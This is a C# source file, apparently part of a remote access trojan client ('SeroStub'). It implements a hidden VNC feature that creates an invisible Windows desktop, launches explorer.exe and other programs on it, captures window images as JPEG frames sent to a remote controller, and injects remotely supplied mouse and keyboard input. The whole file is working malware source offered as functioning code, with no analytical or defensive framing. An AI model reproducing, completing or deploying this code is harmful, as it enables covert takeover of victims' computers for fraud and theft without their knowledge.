using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Threading;

namespace SeroStub;

internal static class HvncFeature
{
    // ── Constants ────────────────────────────────────────────────────────────

    private const string DesktopName  = "SeroHVNC";
    private const uint   DESKTOP_ALL  = 0x01FF;
    private const int    SRCCOPY      = 0x00CC0020;
    private const int    PW_FULL      = 2; // PW_RENDERFULLCONTENT

    private const uint WM_MOUSEMOVE      = 0x0200;
    private const uint WM_LBUTTONDOWN    = 0x0201;
    private const uint WM_LBUTTONUP      = 0x0202;
    private const uint WM_RBUTTONDOWN    = 0x0204;
    private const uint WM_RBUTTONUP      = 0x0205;
    private const uint WM_MBUTTONDOWN    = 0x0207;
    private const uint WM_MBUTTONUP      = 0x0208;
    private const uint WM_MOUSEWHEEL     = 0x020A;
    private const uint WM_KEYDOWN        = 0x0100;
    private const uint WM_KEYUP          = 0x0101;
    private const uint WM_CHAR           = 0x0102;
    private const uint WM_CLOSE          = 0x0010;

    private static readonly Guid JpegClsid  = new("557CF401-1A04-11D3-9A73-0000F81EF32E");
    private static readonly Guid EncQuality = new("1D5BE4B5-FA4A-452D-9CDD-5DB35105E7EB");

    // ── P/Invoke ─────────────────────────────────────────────────────────────

    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    static extern nint CreateDesktop(string lpszDesktop, nint lpszDevice, nint pDevmode,
        int dwFlags, uint dwDesiredAccess, nint lpsa);

    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    static extern nint OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);

    [DllImport("user32.dll")] static extern bool CloseDesktop(nint hDesktop);
    [DllImport("user32.dll")] static extern bool SetThreadDesktop(nint hDesktop);
    [DllImport("user32.dll")] static extern bool EnumDesktopWindows(nint hDesktop, EnumWindowsProc lpfn, nint lParam);
    [DllImport("user32.dll")] static extern bool IsWindowVisible(nint hwnd);
    [DllImport("user32.dll")] static extern bool GetWindowRect(nint hwnd, out RECT lpRect);
    [DllImport("user32.dll")] static extern bool PrintWindow(nint hwnd, nint hdcBlt, uint nFlags);
    [DllImport("user32.dll")] static extern bool PostMessage(nint hwnd, uint msg, nint wParam, nint lParam);
    [DllImport("user32.dll")] static extern nint GetDC(nint hwnd);
    [DllImport("user32.dll")] static extern bool ReleaseDC(nint hwnd, nint hdc);
    [DllImport("user32.dll")] static extern bool IsIconic(nint hwnd);
    [DllImport("user32.dll")] static extern nint WindowFromPoint(int x, int y);
    [DllImport("user32.dll")] static extern nint ChildWindowFromPointEx(nint hwndParent, int x, int y, uint uFlags);

    [DllImport("gdi32.dll")] static extern nint CreateCompatibleDC(nint hdc);
    [DllImport("gdi32.dll")] static extern nint CreateCompatibleBitmap(nint hdc, int cx, int cy);
    [DllImport("gdi32.dll")] static extern nint SelectObject(nint hdc, nint h);
    [DllImport("gdi32.dll")] static extern bool DeleteObject(nint ho);
    [DllImport("gdi32.dll")] static extern bool DeleteDC(nint hdc);
    [DllImport("gdi32.dll")] static extern bool BitBlt(nint hdc, int x, int y, int cx, int cy,
        nint hdcSrc, int x1, int y1, int rop);
    [DllImport("gdi32.dll")] static extern int GetDIBits(nint hdc, nint hbm, uint start, uint lines,
        byte[]? bits, ref BITMAPINFO bmi, uint usage);

    [DllImport("shlwapi.dll")] static extern nint SHCreateMemStream(nint pInit, uint cbInit);
    [DllImport("gdiplus.dll")] static extern int GdiplusStartup(out nint token, ref GdiplusInput inp, nint output);
    [DllImport("gdiplus.dll")] static extern void GdiplusShutdown(nint token);
    [DllImport("gdiplus.dll")] static extern int GdipCreateBitmapFromScan0(int w, int h, int stride, int fmt, nint scan0, out nint bmp);
    [DllImport("gdiplus.dll")] static extern int GdipDisposeImage(nint img);
    [DllImport("gdiplus.dll")] static extern int GdipSaveImageToStream(nint img, nint stream, ref Guid clsid, nint encParams);

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    static extern bool CreateProcessW(nint app, System.Text.StringBuilder cmd,
        nint pa, nint ta, bool inherit, uint flags, nint env, nint dir,
        ref STARTUPINFOW si, out PROCESS_INFORMATION pi);
    [DllImport("kernel32.dll")] static extern bool CloseHandle(nint h);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate bool EnumWindowsProc(nint hwnd, nint lParam);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate uint  VtRelease(nint pThis);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int   VtSeek(nint pThis, long move, uint origin, ref long newPos);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int   VtRead(nint pThis, nint pv, uint cb, out uint cbRead);

    // ── Structs ───────────────────────────────────────────────────────────────

    [StructLayout(LayoutKind.Sequential)]
    struct RECT { public int left, top, right, bottom; }

    [StructLayout(LayoutKind.Sequential)]
    struct BITMAPINFOHEADER
    {
        public uint biSize; public int biWidth, biHeight;
        public ushort biPlanes, biBitCount;
        public uint biCompression, biSizeImage;
        public int biXPelsPerMeter, biYPelsPerMeter;
        public uint biClrUsed, biClrImportant;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct BITMAPINFO
    {
        public BITMAPINFOHEADER bmiHeader;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
        public uint[] bmiColors;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct GdiplusInput { public uint Version; public nint Callback; public int SuppressBackground, SuppressExternalCodecs; }
    [StructLayout(LayoutKind.Sequential)]
    struct EncoderParam { public Guid Guid; public uint Count, Type; public nint Value; }
    [StructLayout(LayoutKind.Sequential)]
    struct EncoderParams { public uint Count; public EncoderParam Param; }
    [StructLayout(LayoutKind.Explicit, Size = 104)]
    struct STARTUPINFOW { [FieldOffset(0)] public uint cb; [FieldOffset(80)] public nint lpDesktop; }
    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION { public nint hProcess, hThread; public uint dwProcessId, dwThreadId; }

    // ── State ─────────────────────────────────────────────────────────────────

    private static nint _hDesktop;
    private static nint _gdipToken;
    private static volatile bool _running;
    private static Thread? _captureThread;
    private static Func<int, string, System.Threading.Tasks.Task>? _send;
    private static readonly AutoResetEvent _ackEvent = new(false);
    private static volatile int _pendingAcks;
    private static int _quality = 75;
    private static int _canvasW = 1280;
    private static int _canvasH = 720;

    // Window list maintained by capture thread (used for input hit-testing)
    private static readonly object _wndLock = new();
    private static List<(nint hwnd, RECT rect)> _windows = new();

    // ── Public API ────────────────────────────────────────────────────────────

    public static void Start(HvncStartDataStub cfg, Func<int, string, System.Threading.Tasks.Task> send)
    {
        Stop();
        _send     = send;
        _quality  = Math.Clamp(cfg.Quality, 10, 95);
        _canvasW  = cfg.Width  > 0 ? cfg.Width  : 1280;
        _canvasH  = cfg.Height > 0 ? cfg.Height : 720;

        // Create or open hidden desktop
        _hDesktop = CreateDesktop(DesktopName, 0, 0, 0, DESKTOP_ALL, 0);
        if (_hDesktop == 0)
            _hDesktop = OpenDesktop(DesktopName, 0, false, DESKTOP_ALL);
        if (_hDesktop == 0) return;

        // Start explorer.exe on the hidden desktop for the shell
        LaunchOnDesktop("explorer.exe");

        EnsureGdiplus();
        Interlocked.Exchange(ref _pendingAcks, 2);
        _running = true;
        _captureThread = new Thread(() => CaptureLoop())
        {
            IsBackground = true, Name = "HvncCapture", Priority = ThreadPriority.BelowNormal
        };
        _captureThread.Start();
    }

    public static void Stop()
    {
        _running = false;
        _ackEvent.Set();
        _captureThread?.Join(2000);
        _captureThread = null;

        if (_hDesktop != 0)
        {
            CloseDesktop(_hDesktop);
            _hDesktop = 0;
        }
        if (_gdipToken != 0)
        {
            GdiplusShutdown(_gdipToken);
            _gdipToken = 0;
        }
    }

    public static void SignalAck()
    {
        Interlocked.Increment(ref _pendingAcks);
        _ackEvent.Set();
    }

    public static void HandleInput(string data)
    {
        if (_hDesktop == 0) return;
        var inp = JsonSerializer.Deserialize(data, SeroJson.Default.HvncInputDataStub);
        if (inp == null) return;
        PostInputEvent(inp);
    }

    public static void ExecOnDesktop(string path)
    {
        LaunchOnDesktop(path);
    }

    // ── Capture loop ──────────────────────────────────────────────────────────

    private static void CaptureLoop()
    {
        // Bind this thread to the hidden desktop for the duration of the session
        if (_hDesktop != 0) SetThreadDesktop(_hDesktop);

        try
        {
            while (_running)
            {
                if (_pendingAcks <= 0)
                {
                    _ackEvent.WaitOne(200);
                    if (!_running) break;
                    if (_pendingAcks <= 0) continue;
                }
                Interlocked.Decrement(ref _pendingAcks);

                try
                {
                    var jpeg = CaptureDesktop(_canvasW, _canvasH);
                    if (jpeg != null)
                    {
                        var frame = new HvncFrameDataStub { W = _canvasW, H = _canvasH, J = Convert.ToBase64String(jpeg) };
                        _send?.Invoke((int)PacketType.HvncFrame,
                            JsonSerializer.Serialize(frame, SeroJson.Default.HvncFrameDataStub));
                    }
                    else
                    {
                        Interlocked.Increment(ref _pendingAcks); // no change, don't consume credit
                        Thread.Sleep(50);
                    }
                }
                catch { Thread.Sleep(33); }
            }
        }
        catch { }
    }

    // ── Desktop capture via PrintWindow compositing ───────────────────────────

    private static unsafe byte[]? CaptureDesktop(int width, int height)
    {
        // Create off-screen DC/bitmap using the default screen pixel format
        nint hdcRef = GetDC(0);
        if (hdcRef == 0) return null;

        nint hdcMem = CreateCompatibleDC(hdcRef);
        nint hbm    = CreateCompatibleBitmap(hdcRef, width, height);
        nint hOld   = SelectObject(hdcMem, hbm);

        try
        {
            // Enumerate windows on the hidden desktop, bottom-to-top Z-order
            var wins = new List<(nint hwnd, RECT rect)>();
            EnumDesktopWindows(_hDesktop, (hwnd, _) =>
            {
                if (IsWindowVisible(hwnd) && !IsIconic(hwnd))
                {
                    GetWindowRect(hwnd, out var r);
                    if (r.right > r.left && r.bottom > r.top)
                        wins.Add((hwnd, r));
                }
                return true;
            }, 0);

            // Update cached window list for input hit-testing
            lock (_wndLock) { _windows = wins; }

            if (wins.Count == 0) return null;

            // Paint bottom-to-top (EnumDesktopWindows gives top-to-bottom Z-order)
            for (int i = wins.Count - 1; i >= 0; i--)
            {
                var (hwnd, r) = wins[i];
                int ww = r.right  - r.left;
                int wh = r.bottom - r.top;

                // Clip: skip windows entirely outside the canvas
                if (r.left >= width || r.top >= height || r.right <= 0 || r.bottom <= 0) continue;

                // PrintWindow into a temporary DC sized to the window
                nint hdcWin = CreateCompatibleDC(hdcRef);
                nint hbmWin = CreateCompatibleBitmap(hdcRef, ww, wh);
                nint hOldW  = SelectObject(hdcWin, hbmWin);

                PrintWindow(hwnd, hdcWin, PW_FULL);

                // Blit at window position, clipped to canvas
                int destX  = r.left;
                int destY  = r.top;
                int blitW  = Math.Min(ww, width  - Math.Max(0, destX));
                int blitH  = Math.Min(wh, height - Math.Max(0, destY));
                int srcX   = destX < 0 ? -destX : 0;
                int srcY   = destY < 0 ? -destY : 0;
                if (destX < 0) destX = 0;
                if (destY < 0) destY = 0;
                if (blitW > 0 && blitH > 0)
                    BitBlt(hdcMem, destX, destY, blitW, blitH, hdcWin, srcX, srcY, SRCCOPY);

                SelectObject(hdcWin, hOldW);
                DeleteObject(hbmWin);
                DeleteDC(hdcWin);
            }

            // Extract raw pixels (BGRA, top-down)
            var bmi = new BITMAPINFO
            {
                bmiHeader = new BITMAPINFOHEADER
                {
                    biSize       = (uint)Marshal.SizeOf<BITMAPINFOHEADER>(),
                    biWidth      = width,
                    biHeight     = -height, // negative = top-down
                    biPlanes     = 1,
                    biBitCount   = 32,
                    biCompression = 0
                },
                bmiColors = new uint[4]
            };
            var pixels = new byte[width * height * 4];
            GetDIBits(hdcMem, hbm, 0, (uint)height, pixels, ref bmi, 0);

            return EncodeJpeg(pixels, width, height);
        }
        finally
        {
            SelectObject(hdcMem, hOld);
            DeleteObject(hbm);
            DeleteDC(hdcMem);
            ReleaseDC(0, hdcRef);
        }
    }

    // ── JPEG encoding (GDI+ same pattern as RemoteDesktopFeature) ────────────

    private static unsafe byte[]? EncodeJpeg(byte[] pixels, int w, int h)
    {
        if (_gdipToken == 0) return null;

        fixed (byte* pix = pixels)
        {
            // stride = w * 4 bytes, format 0x26200A = PixelFormat32bppBGR
            if (GdipCreateBitmapFromScan0(w, h, w * 4, 0x26200A, (nint)pix, out nint bmp) != 0 || bmp == 0)
                return null;

            try
            {
                nint stream = SHCreateMemStream(0, 0);
                if (stream == 0) return null;

                int q = _quality;
                var ep = new EncoderParams
                {
                    Count = 1,
                    Param = new EncoderParam { Guid = EncQuality, Count = 1, Type = 4, Value = (nint)(&q) }
                };
                var clsid = JpegClsid;
                GdipSaveImageToStream(bmp, stream, ref clsid, (nint)(&ep));

                // Seek to beginning and read bytes
                long pos = 0;
                var vtSeek = Marshal.GetDelegateForFunctionPointer<VtSeek>((*(nint**)stream)[5]);
                vtSeek(stream, 0, 0, ref pos);

                var chunks = new List<byte[]>();
                int total = 0;
                var buf = new byte[65536];
                fixed (byte* pbuf = buf)
                {
                    var vtRead = Marshal.GetDelegateForFunctionPointer<VtRead>((*(nint**)stream)[3]);
                    while (true)
                    {
                        uint cbRead = 0;
                        vtRead(stream, (nint)pbuf, (uint)buf.Length, out cbRead);
                        if (cbRead == 0) break;
                        var chunk = new byte[cbRead];
                        Buffer.BlockCopy(buf, 0, chunk, 0, (int)cbRead);
                        chunks.Add(chunk);
                        total += (int)cbRead;
                    }
                }
                Marshal.GetDelegateForFunctionPointer<VtRelease>((*(nint**)stream)[2])(stream);

                if (total == 0) return null;
                var result = new byte[total];
                int offset = 0;
                foreach (var c in chunks) { Buffer.BlockCopy(c, 0, result, offset, c.Length); offset += c.Length; }
                return result;
            }
            finally { GdipDisposeImage(bmp); }
        }
    }

    private static void EnsureGdiplus()
    {
        if (_gdipToken != 0) return;
        var inp = new GdiplusInput { Version = 1 };
        GdiplusStartup(out _gdipToken, ref inp, 0);
    }

    // ── Input injection ───────────────────────────────────────────────────────

    private static void PostInputEvent(HvncInputDataStub inp)
    {
        nint hwnd = FindWindowAt(inp.X, inp.Y);
        if (hwnd == 0) return;

        GetWindowRect(hwnd, out var r);
        int relX = inp.X - r.left;
        int relY = inp.Y - r.top;
        nint lParam = (nint)((relY << 16) | (relX & 0xFFFF));

        switch (inp.T)
        {
            case "mm":
                PostMessage(hwnd, WM_MOUSEMOVE, 0, lParam);
                break;
            case "mc":
                if (inp.Button == 0)
                    PostMessage(hwnd, inp.Down ? WM_LBUTTONDOWN : WM_LBUTTONUP, inp.Down ? (nint)1 : 0, lParam);
                else if (inp.Button == 1)
                    PostMessage(hwnd, inp.Down ? WM_RBUTTONDOWN : WM_RBUTTONUP, inp.Down ? (nint)2 : 0, lParam);
                else
                    PostMessage(hwnd, inp.Down ? WM_MBUTTONDOWN : WM_MBUTTONUP, inp.Down ? (nint)16 : 0, lParam);
                break;
            case "mw":
                nint wp = (nint)((inp.WheelDelta & 0xFFFF) << 16);
                PostMessage(hwnd, WM_MOUSEWHEEL, wp, lParam);
                break;
            case "kd":
            case "ku":
                PostMessage(hwnd, inp.T == "kd" ? WM_KEYDOWN : WM_KEYUP, (nint)inp.VK, 0);
                if (inp.T == "kd" && inp.VK >= 0x20)
                    PostMessage(hwnd, WM_CHAR, (nint)inp.VK, 0);
                break;
        }
    }

    private static nint FindWindowAt(int x, int y)
    {
        List<(nint hwnd, RECT rect)> wins;
        lock (_wndLock) { wins = new List<(nint, RECT)>(_windows); }

        // Top-to-bottom Z-order: first match wins
        for (int i = 0; i < wins.Count; i++)
        {
            var (hwnd, r) = wins[i];
            if (x >= r.left && x < r.right && y >= r.top && y < r.bottom)
                return hwnd;
        }
        return wins.Count > 0 ? wins[0].hwnd : 0;
    }

    // ── Process launcher on hidden desktop ───────────────────────────────────

    private static void LaunchOnDesktop(string path)
    {
        if (_hDesktop == 0) return;
        try
        {
            var desktopName = System.Runtime.InteropServices.Marshal.StringToHGlobalUni(DesktopName);
            var si = new STARTUPINFOW { cb = 104, lpDesktop = desktopName };
            var sb = new System.Text.StringBuilder(path);
            CreateProcessW(0, sb, 0, 0, false, 0x00000008 /*DETACHED_PROCESS*/, 0, 0, ref si, out var pi);
            if (pi.hProcess != 0) CloseHandle(pi.hProcess);
            if (pi.hThread  != 0) CloseHandle(pi.hThread);
            System.Runtime.InteropServices.Marshal.FreeHGlobal(desktopName);
        }
        catch { }
    }
}
